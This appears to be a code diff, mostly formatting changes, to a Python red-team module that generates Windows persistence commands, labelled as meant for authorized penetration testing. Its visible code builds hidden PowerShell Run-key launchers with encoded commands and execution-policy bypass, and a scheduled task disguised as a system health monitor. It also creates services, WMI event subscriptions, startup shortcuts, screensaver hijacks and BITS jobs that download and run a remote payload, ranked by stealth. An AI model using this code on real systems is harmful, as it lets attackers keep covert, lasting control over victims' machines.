@@ -5,20 +5,21 @@ Windows 持久化模块 - Windows Persistence
 仅用于授权渗透测试
 """
 
-import os
 import base64
+import logging
+import os
 import secrets
 import string
-import logging
-from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 from enum import Enum
+from typing import Any, Dict, List, Optional
 
 logger = logging.getLogger(__name__)
 
 
 class PersistenceMethod(Enum):
     """持久化方法"""
+
     REGISTRY_RUN = "registry_run"
     REGISTRY_RUNONCE = "registry_runonce"
     SCHEDULED_TASK = "scheduled_task"
@@ -34,6 +35,7 @@ class PersistenceMethod(Enum):
 @dataclass
 class PersistenceResult:
     """持久化结果"""
+
     success: bool
     method: str
     location: str
@@ -63,7 +65,7 @@ class WindowsPersistence:
     """
 
     def __init__(self):
-        self._random_prefix = ''.join(secrets.choice(string.ascii_letters) for _ in range(4))
+        self._random_prefix = "".join(secrets.choice(string.ascii_letters) for _ in range(4))
 
     def _generate_name(self, prefix: str = "Win") -> str:
         """生成随机名称"""
@@ -72,11 +74,9 @@ class WindowsPersistence:
 
     # ==================== 注册表持久化 ====================
 
-    def registry_run(self,
-                     payload_path: str,
-                     name: str = "",
-                     hive: str = "HKCU",
-                     hidden: bool = False) -> PersistenceResult:
+    def registry_run(
+        self, payload_path: str, name: str = "", hive: str = "HKCU", hidden: bool = False
+    ) -> PersistenceResult:
         """
         注册表 Run 键持久化
 
@@ -104,13 +104,12 @@ class WindowsPersistence:
             success=True,
             method=PersistenceMethod.REGISTRY_RUN.value,
             location=f"{reg_path}\\{name}",
-            cleanup_command=cleanup
+            cleanup_command=cleanup,
         )
 
-    def registry_run_powershell(self,
-                                 payload_path: str,
-                                 name: str = "",
-                                 encoded: bool = True) -> PersistenceResult:
+    def registry_run_powershell(
+        self, payload_path: str, name: str = "", encoded: bool = True
+    ) -> PersistenceResult:
         """
         注册表 Run 键 + PowerShell 启动
 
@@ -124,10 +123,12 @@ class WindowsPersistence:
         if encoded:
             # Base64 编码 PowerShell 命令
             ps_cmd = f'IEX (Get-Content "{payload_path}" -Raw)'
-            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
-            value = f'powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}'
+            encoded_cmd = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
+            value = f"powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
         else:
-            value = f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{payload_path}"'
+            value = (
+                f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{payload_path}"'
+            )
 
         reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
         command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{value}" /f'
@@ -137,17 +138,19 @@ class WindowsPersistence:
             success=True,
             method=PersistenceMethod.REGISTRY_RUN.value,
             location=f"{reg_path}\\{name}",
-            cleanup_command=cleanup
+            cleanup_command=cleanup,
         )
 
     # ==================== 计划任务持久化 ====================
 
-    def scheduled_task(self,
-                       payload_path: str,
-                       name: str = "",
-                       trigger: str = "onlogon",
-                       interval_minutes: int = 0,
-                       run_level: str = "limited") -> PersistenceResult:
+    def scheduled_task(
+        self,
+        payload_path: str,
+        name: str = "",
+        trigger: str = "onlogon",
+        interval_minutes: int = 0,
+        run_level: str = "limited",
+    ) -> PersistenceResult:
         """
         计划任务持久化
 
@@ -183,13 +186,12 @@ class WindowsPersistence:
             success=True,
             method=PersistenceMethod.SCHEDULED_TASK.value,
             location=f"Task Scheduler\\{name}",
-            cleanup_command=cleanup
+            cleanup_command=cleanup,
         )
 
-    def scheduled_task_xml(self,
-                           payload_path: str,
-                           name: str = "",
-                           hidden: bool = True) -> Dict[str, str]:
+    def scheduled_task_xml(
+        self, payload_path: str, name: str = "", hidden: bool = True
+    ) -> Dict[str, str]:
         """
         生成计划任务 XML 文件 (更隐蔽)
 
@@ -198,7 +200,7 @@ class WindowsPersistence:
         """
         name = name or self._generate_name("Task")
 
-        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
+        xml_content = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Description>Windows System Health Monitor</Description>
@@ -232,22 +234,20 @@ class WindowsPersistence:
       <Command>{payload_path}</Command>
     </Exec>
   </Actions>
-</Task>'''
+</Task>"""
 
         return {
             "xml_content": xml_content,
             "import_command": f'schtasks /create /tn "{name}" /xml task.xml /f',
             "cleanup_command": f'schtasks /delete /tn "{name}" /f',
-            "task_name": name
+            "task_name": name,
         }
 
     # ==================== 服务持久化 ====================
 
-    def service_create(self,
-                       payload_path: str,
-                       name: str = "",
-                       display_name: str = "",
-                       start_type: str = "auto") -> PersistenceResult:
+    def service_create(
+        self, payload_path: str, name: str = "", display_name: str = "", start_type: str = "auto"
+    ) -> PersistenceResult:
         """
         Windows 服务持久化
 
@@ -268,15 +268,14 @@ class WindowsPersistence:
             success=True,
             method=PersistenceMethod.SERVICE.value,
             location=f"Services\\{name}",
-            cleanup_command=cleanup
+            cleanup_command=cleanup,
         )
 
     # ==================== WMI 事件订阅 ====================
 
-    def wmi_subscription(self,
-                         payload_path: str,
-                         name: str = "",
-                         trigger: str = "startup") -> Dict[str, str]:
+    def wmi_subscription(
+        self, payload_path: str, name: str = "", trigger: str = "startup"
+    ) -> Dict[str, str]:
         """
         WMI 事件订阅持久化 (隐蔽性高)
 
@@ -296,7 +295,7 @@ class WindowsPersistence:
             wql = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0"
 
         # PowerShell 创建 WMI 订阅
-        ps_script = f'''
+        ps_script = f"""
 $FilterName = "{name}_Filter"
 $ConsumerName = "{name}_Consumer"
 $SubscriptionName = "{name}_Subscription"
@@ -323,27 +322,26 @@ $BindingArgs = @{{
     Consumer = $Consumer
 }}
 Set-WmiInstance -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" -Arguments $BindingArgs
-'''
+"""
 
-        cleanup_script = f'''
+        cleanup_script = f"""
 Get-WmiObject -Namespace "root\\subscription" -Class "__EventFilter" | Where-Object Name -eq "{name}_Filter" | Remove-WmiObject
 Get-WmiObject -Namespace "root\\subscription" -Class "CommandLineEventConsumer" | Where-Object Name -eq "{name}_Consumer" | Remove-WmiObject
 Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding" | Where-Object {{ $_.Filter -like "*{name}*" }} | Remove-WmiObject
-'''
+"""
 
         return {
             "install_script": ps_script,
             "cleanup_script": cleanup_script,
             "method": PersistenceMethod.WMI_SUBSCRIPTION.value,
-            "subscription_name": name
+            "subscription_name": name,
         }
 
     # ==================== 启动文件夹 ====================
 
-    def startup_folder(self,
-                       payload_path: str,
-                       name: str = "",
-                       all_users: bool = False) -> PersistenceResult:
+    def startup_folder(
+        self, payload_path: str, name: str = "", all_users: bool = False
+    ) -> PersistenceResult:
         """
         启动文件夹持久化
 
@@ -361,19 +359,19 @@ Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
 
         # 创建快捷方式的 VBScript
         lnk_name = f"{name}.lnk"
-        vbs_script = f'''
+        vbs_script = f"""
 Set WshShell = CreateObject("WScript.Shell")
 Set lnk = WshShell.CreateShortcut("{startup_path}\\{lnk_name}")
 lnk.TargetPath = "{payload_path}"
 lnk.WindowStyle = 7
 lnk.Save
-'''
+"""
 
         return PersistenceResult(
             success=True,
             method=PersistenceMethod.STARTUP_FOLDER.value,
             location=f"{startup_path}\\{lnk_name}",
-            cleanup_command=f'del "{startup_path}\\{lnk_name}"'
+            cleanup_command=f'del "{startup_path}\\{lnk_name}"',
         )
 
     # ==================== 屏保持久化 ====================
@@ -383,7 +381,9 @@ lnk.Save
         屏保持久化 (需要管理员权限修改 HKLM)
         """
         commands = [
-            'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{}" /f'.format(payload_path),
+            'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{}" /f'.format(
+                payload_path
+            ),
             'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f',
             'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f',
         ]
@@ -396,15 +396,12 @@ lnk.Save
             success=True,
             method=PersistenceMethod.SCREENSAVER.value,
             location="HKCU\\Control Panel\\Desktop\\SCRNSAVE.EXE",
-            cleanup_command=" & ".join(cleanup_commands)
+            cleanup_command=" & ".join(cleanup_commands),
         )
 
     # ==================== BITS Job ====================
 
-    def bits_job(self,
-                 payload_url: str,
-                 local_path: str,
-                 name: str = "") -> PersistenceResult:
+    def bits_job(self, payload_url: str, local_path: str, name: str = "") -> PersistenceResult:
         """
         BITS Job 持久化 (可用于下载和执行)
 
@@ -427,7 +424,7 @@ lnk.Save
             success=True,
             method=PersistenceMethod.BITS_JOB.value,
             location=f"BITS Job: {name}",
-            cleanup_command=f'bitsadmin /cancel "{name}"'
+            cleanup_command=f'bitsadmin /cancel "{name}"',
         )
 
     # ==================== 综合方法 ====================
@@ -443,62 +440,71 @@ lnk.Save
 
         # 注册表
         result = self.registry_run(payload_path)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "cleanup": result.cleanup_command,
-            "requires_admin": False,
-            "stealth": "low"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "cleanup": result.cleanup_command,
+                "requires_admin": False,
+                "stealth": "low",
+            }
+        )
 
         # 计划任务
         result = self.scheduled_task(payload_path)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "cleanup": result.cleanup_command,
-            "requires_admin": False,
-            "stealth": "medium"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "cleanup": result.cleanup_command,
+                "requires_admin": False,
+                "stealth": "medium",
+            }
+        )
 
         # 服务 (需要管理员)
         result = self.service_create(payload_path)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "cleanup": result.cleanup_command,
-            "requires_admin": True,
-            "stealth": "low"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "cleanup": result.cleanup_command,
+                "requires_admin": True,
+                "stealth": "low",
+            }
+        )
 
         # WMI 订阅 (需要管理员)
         wmi_result = self.wmi_subscription(payload_path)
-        methods.append({
-            "method": wmi_result["method"],
-            "location": f"WMI Subscription: {wmi_result['subscription_name']}",
-            "cleanup": wmi_result["cleanup_script"],
-            "requires_admin": True,
-            "stealth": "high"
-        })
+        methods.append(
+            {
+                "method": wmi_result["method"],
+                "location": f"WMI Subscription: {wmi_result['subscription_name']}",
+                "cleanup": wmi_result["cleanup_script"],
+                "requires_admin": True,
+                "stealth": "high",
+            }
+        )
 
         # 启动文件夹
         result = self.startup_folder(payload_path)
-        methods.append({
-            "method": result.method,
-            "location": result.location,
-            "cleanup": result.cleanup_command,
-            "requires_admin": False,
-            "stealth": "low"
-        })
+        methods.append(
+            {
+                "method": result.method,
+                "location": result.location,
+                "cleanup": result.cleanup_command,
+                "requires_admin": False,
+                "stealth": "low",
+            }
+        )
 
         return methods
 
 
 # 便捷函数
-def windows_persist(payload_path: str,
-                    method: str = "registry",
-                    name: str = "",
-                    **kwargs) -> Dict[str, Any]:
+def windows_persist(
+    payload_path: str, method: str = "registry", name: str = "", **kwargs
+) -> Dict[str, Any]:
     """
     Windows 持久化便捷函数
 
@@ -525,7 +531,7 @@ def windows_persist(payload_path: str,
             "success": True,
             "method": method,
             "install_script": result["install_script"],
-            "cleanup_script": result["cleanup_script"]
+            "cleanup_script": result["cleanup_script"],
         }
 
     if method == "bits":
@@ -533,7 +539,11 @@ def windows_persist(payload_path: str,
             return {"success": False, "error": "BITS method requires payload_url"}
         result = persistence.bits_job(kwargs["payload_url"], payload_path, name)
     elif method in method_map:
-        result = method_map[method](payload_path, name, **kwargs) if name else method_map[method](payload_path, **kwargs)
+        result = (
+            method_map[method](payload_path, name, **kwargs)
+            if name
+            else method_map[method](payload_path, **kwargs)
+        )
     else:
         return {"success": False, "error": f"Unknown method: {method}"}
 
@@ -542,27 +552,52 @@ def windows_persist(payload_path: str,
         "method": result.method,
         "location": result.location,
         "cleanup_command": result.cleanup_command,
-        "error": result.error
+        "error": result.error,
     }
 
 
 def list_persistence_methods() -> List[Dict[str, str]]:
     """列出所有可用的持久化方法"""
     return [
-        {"method": "registry", "description": "注册表 Run 键", "admin_required": False, "stealth": "low"},
-        {"method": "registry_ps", "description": "注册表 + PowerShell", "admin_required": False, "stealth": "medium"},
+        {
+            "method": "registry",
+            "description": "注册表 Run 键",
+            "admin_required": False,
+            "stealth": "low",
+        },
+        {
+            "method": "registry_ps",
+            "description": "注册表 + PowerShell",
+            "admin_required": False,
+            "stealth": "medium",
+        },
         {"method": "task", "description": "计划任务", "admin_required": False, "stealth": "medium"},
-        {"method": "service", "description": "Windows 服务", "admin_required": True, "stealth": "low"},
+        {
+            "method": "service",
+            "description": "Windows 服务",
+            "admin_required": True,
+            "stealth": "low",
+        },
         {"method": "wmi", "description": "WMI 事件订阅", "admin_required": True, "stealth": "high"},
-        {"method": "startup", "description": "启动文件夹", "admin_required": False, "stealth": "low"},
-        {"method": "screensaver", "description": "屏保劫持", "admin_required": False, "stealth": "medium"},
+        {
+            "method": "startup",
+            "description": "启动文件夹",
+            "admin_required": False,
+            "stealth": "low",
+        },
+        {
+            "method": "screensaver",
+            "description": "屏保劫持",
+            "admin_required": False,
+            "stealth": "medium",
+        },
         {"method": "bits", "description": "BITS Job", "admin_required": False, "stealth": "high"},
     ]
 
 
 if __name__ == "__main__":
     # 配置测试用日志
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
 
     logger.info("Windows Persistence Module")
     logger.info("=" * 50)
